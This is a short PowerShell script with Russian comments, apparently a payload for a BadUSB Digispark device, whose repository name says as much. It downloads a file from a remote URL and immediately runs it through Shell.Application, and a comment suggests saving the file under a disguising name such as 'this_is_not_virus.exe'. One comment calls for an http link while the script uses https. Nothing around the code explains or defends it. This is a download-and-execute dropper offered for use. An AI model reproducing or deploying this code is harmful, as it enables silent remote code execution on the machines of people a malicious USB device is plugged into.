$url_file = 'https://raw.githubusercontent.com/Kreefe/badusbdigispark/main/1.txt' #Ссылка на файл, обязательно http (не https) и в кавычках
$file = '99.txt'	#Под каким названием сохранить файл, так же можно указать путь "C:\Windows\this_is_not_virus.exe"

PowerShell (New-Object System.Net.WebClient).DownloadFile($url_file,$file), #Запуск PowerShell с передачей ему строки для скачивания файла
(New-Object -com Shell.Application).ShellExecute($file);  #Строчка для запуска файла, который мы скачали
